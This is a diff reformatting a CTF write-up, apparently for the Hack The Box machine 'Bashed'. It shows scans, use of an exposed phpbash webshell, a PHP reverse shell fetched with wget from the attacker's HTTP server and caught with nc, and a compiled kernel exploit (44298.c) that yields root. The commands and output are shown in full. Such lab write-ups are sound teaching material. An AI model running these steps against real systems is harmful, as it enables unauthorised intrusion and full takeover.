@@ -1,7 +1,8 @@
 
-Discover & Exploit : 
+## Discover & Exploit : 
 
-	1. root@kali:/tmp# nmap -A -sV -sC -p- 10.10.10.68
+1. root@kali:/tmp# nmap -A -sV -sC -p- 10.10.10.68
+```
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-23 09:11 EDT
 Nmap scan report for 10.10.10.68
 Host is up (0.028s latency).
@@ -29,10 +30,9 @@ TRACEROUTE (using port 1025/tcp)
 HOP RTT      ADDRESS
 1   27.05 ms 10.10.14.1
 2   27.76 ms 10.10.10.68
-
-
-	2. root@kali:~# dirb http://10.10.10.68
-
+```
+2. root@kali:~# dirb http://10.10.10.68
+```
 -----------------
 DIRB v2.22    
 By The Dark Raver
@@ -87,13 +87,17 @@ GENERATED WORDS: 4612
 -----------------
 END_TIME: Sun Aug 16 18:20:37 2020
 DOWNLOADED: 9224 - FOUND: 3
+```
+
+>Noticed in /dev we have phpbash which is a semi interactive webshell, so we can get a shell from using this , more info on https://github.com/Arrexel/phpbash
 
 
-Noticed in /dev we have phpbash which is a semi interactive webshell, so we can get a shell from using this , more info on https://github.com/Arrexel/phpbash
+>Also, we see from the server is at Apache/2.4.18 (Ubuntu) Server at 127.0.1.1 Port 80
 
-Also, we see from the server is at Apache/2.4.18 (Ubuntu) Server at 127.0.1.1 Port 80
-
-	3. root@kali:~# nikto -h 127.0.1.1 -useproxy http://10.10.10.68
+>Configure Proxy in browser to use 10.10.10.68
+	
+3. root@kali:~# nikto -h 127.0.1.1 -useproxy http://10.10.10.68
+```
 	- Nikto v2.1.6
 	---------------------------------------------------------------------------
 	+ Target IP:          127.0.1.1
@@ -117,77 +121,78 @@ Also, we see from the server is at Apache/2.4.18 (Ubuntu) Server at 127.0.1.1 Po
 	+ End Time:           2020-08-23 09:36:38 (GMT-4) (518 seconds)
 	---------------------------------------------------------------------------
 	+ 1 host(s) tested
+```	
 	
+4. Browse to http://127.0.1.1/dev/phpbash.php , we get the shell in the browser
 
+5. root@kali:/tmp# cp /usr/share/webshells/php/php-reverse-shell.php .
 
-	4. Configure Proxy in browser to use 10.10.10.68
-	
+>Edit to include attacker IP and port in php-reverse-shell.php
 
+6. root@kali:/tmp# python -m SimpleHTTPServer 8000
+	
+7. From the browser we upload the webshell
+```
+www-data@bashed :/var/www/html/uploads# wget http://10.10.14.37:8000/php-reverse-shell.php
+	
+--2020-08-21 19:37:46-- http://10.10.14.37:8000/php-reverse-shell.php
+Connecting to 10.10.14.37:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5493 (5.4K) [application/octet-stream]
+Saving to: 'php-reverse-shell.php'
+	
+0K ..... 100% 28.2M=0s
+	
+2020-08-21 19:37:46 (28.2 MB/s) - 'php-reverse-shell.php' saved [5493/5493]
+```	
 
-	5. Browse to http://127.0.1.1/dev/phpbash.php , we get the shell in the browser
+8. Start from attacker Machine nc -nvlp 4444 and browse http://127.0.1.1/uploads/php-reverse-shell.php
+	
+   root@kali:~# nc -nvlp 4444
+```
+listening on [any] 4444 ...
+connect to [10.10.14.37] from (UNKNOWN) [10.10.10.68] 45702
+Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+17:45:01 up 6 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                                                                                                                                 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                                                               
+/bin/sh: 0: can't access tty; job control turned off                                                                                                                                                
+$ python -c 'import pty; pty.spawn("/bin/bash")'                                                                                                                                                    
+www-data@bashed:/$
+```	
+	
+9. www-data@bashed:/home/arrexel$ ls -la
+```
+ls -la
+total 36
+drwxr-xr-x 4 arrexel arrexel 4096 Dec  4  2017 .
+drwxr-xr-x 4 root    root    4096 Dec  4  2017 ..
+-rw------- 1 arrexel arrexel    1 Dec 23  2017 .bash_history
+-rw-r--r-- 1 arrexel arrexel  220 Dec  4  2017 .bash_logout
+-rw-r--r-- 1 arrexel arrexel 3786 Dec  4  2017 .bashrc
+drwx------ 2 arrexel arrexel 4096 Dec  4  2017 .cache
+drwxrwxr-x 2 arrexel arrexel 4096 Dec  4  2017 .nano
+-rw-r--r-- 1 arrexel arrexel  655 Dec  4  2017 .profile
+-rw-r--r-- 1 arrexel arrexel    0 Dec  4  2017 .sudo_as_admin_successful
+-r--r--r-- 1 arrexel arrexel   33 Dec  4  2017 user.txt
+```
 
-	6. root@kali:/tmp# cp /usr/share/webshells/php/php-reverse-shell.php .
+10. www-data@bashed:/home/arrexel# cat user.txt
 
-Edit to include attacker IP and port
-
-	7. root@kali:/tmp# python -m SimpleHTTPServer 8000
-	Serving HTTP on 0.0.0.0 port 8000 ...
-	
-	
-	8. From the browser we upload the webshell
-	www-data@bashed :/var/www/html/uploads# wget http://10.10.14.37:8000/php-reverse-shell.php
-	
-	--2020-08-21 19:37:46-- http://10.10.14.37:8000/php-reverse-shell.php
-	Connecting to 10.10.14.37:8000... connected.
-	HTTP request sent, awaiting response... 200 OK
-	Length: 5493 (5.4K) [application/octet-stream]
-	Saving to: 'php-reverse-shell.php'
-	
-	0K ..... 100% 28.2M=0s
-	
-	2020-08-21 19:37:46 (28.2 MB/s) - 'php-reverse-shell.php' saved [5493/5493]
-	
-	9. Start from attacker Machine nc -nvlp 4444 and browse http://127.0.1.1/uploads/php-reverse-shell.php
-	
-	root@kali:~# nc -nvlp 4444
-	listening on [any] 4444 ...
-	connect to [10.10.14.37] from (UNKNOWN) [10.10.10.68] 45702
-	Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
-	 17:45:01 up 6 min,  0 users,  load average: 0.00, 0.00, 0.00
-	USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                                                                                                                                 
-	uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                                                               
-	/bin/sh: 0: can't access tty; job control turned off                                                                                                                                                
-	$ python -c 'import pty; pty.spawn("/bin/bash")'                                                                                                                                                    
-	www-data@bashed:/$
-	
-	
-	10. www-data@bashed:/home/arrexel$ ls -la
-	ls -la
-	total 36
-	drwxr-xr-x 4 arrexel arrexel 4096 Dec  4  2017 .
-	drwxr-xr-x 4 root    root    4096 Dec  4  2017 ..
-	-rw------- 1 arrexel arrexel    1 Dec 23  2017 .bash_history
-	-rw-r--r-- 1 arrexel arrexel  220 Dec  4  2017 .bash_logout
-	-rw-r--r-- 1 arrexel arrexel 3786 Dec  4  2017 .bashrc
-	drwx------ 2 arrexel arrexel 4096 Dec  4  2017 .cache
-	drwxrwxr-x 2 arrexel arrexel 4096 Dec  4  2017 .nano
-	-rw-r--r-- 1 arrexel arrexel  655 Dec  4  2017 .profile
-	-rw-r--r-- 1 arrexel arrexel    0 Dec  4  2017 .sudo_as_admin_successful
-	-r--r--r-- 1 arrexel arrexel   33 Dec  4  2017 user.txt
-	
-	11. www-data@bashed :/home/arrexel# cat user.txt
-	2c281f318555dbc1b856957c7147bfc1
+    2c281f318555dbc1b856957c7147bfc1
          
 	
 
-Privilege escalation :
+## Privilege escalation :
 
 
-	1. www-data@bashed:/scripts$ uname -a
-	uname -a
-	Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
-	
- 2.  root@kali:/tmp# searchsploit linux kernel 4.4. privilege Escalation
+1. www-data@bashed:/scripts$ uname -a
+```
+uname -a
+Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+```	
+2.  root@kali:/tmp# searchsploit linux kernel 4.4. privilege Escalation
+```
 ----------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
  Exploit Title                                                                                                                                             |  Path
                                                                                                                                                            | (/usr/share/exploitdb/)
@@ -204,17 +209,17 @@ Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Pri
 Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                                      | exploits/linux/local/43418.c
 Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)                                  | exploits/linux/local/47169.c
 ----------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+```
 
+>Tried few exploit from this list , noticed exploit 44298.c to be working
 
-Tried few exploit from this list , noticed exploit 44298.c to be working
-
-
-	3. root@kali:/tmp# cp /usr/share/exploitdb/exploits/linux/local/44298.c .
-	root@kali:/tmp# gcc 44298.c -o pww
+3. root@kali:/tmp# cp /usr/share/exploitdb/exploits/linux/local/44298.c .
+   
+   root@kali:/tmp# gcc 44298.c -o pww
 	
-
-	4. www-data@bashed:/scripts$ wget http://10.10.14.37:8000/pww
---2020-08-22 05:27:15--  http://10.10.14.37:8000/pww
+4. www-data@bashed:/scripts$ wget http://10.10.14.37:8000/pww
+```
+http://10.10.14.37:8000/pww
 Connecting to 10.10.14.37:8000... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 17888 (17K) [application/octet-stream]
@@ -223,21 +228,18 @@ Saving to: 'pww'
 pww                 100%[===================>]  17.47K  --.-KB/s    in 0.03s   
 
 2020-08-22 05:27:15 (540 KB/s) - 'pww' saved [17888/17888]
+```
+5. www-data@bashed:/scripts$ chmod 777 pww
 
-	5. www-data@bashed:/scripts$ chmod 777 pww
-chmod 777 pww
-
-	6. www-data@bashed:/scripts$ ./pww
+6. www-data@bashed:/scripts$ ./pww
+```
 ./pww
 task_struct = ffff880035124600
 uidptr = ffff880035243bc4
 spawning root shell
-root@bashed:/scripts# cd /root
-cd /root
-root@bashed:/root# ls     
-ls
-root.txt
+root@bashed:/scripts#
+```
 
-	7. root@bashed:/root# cat root.txt
-cat root.txt
-cc4f0afe3a1026d402ba10329674a8e2
+7. root@bashed:/root# cat root.txt
+
+   cc4f0afe3a1026d402ba10329674a8e2
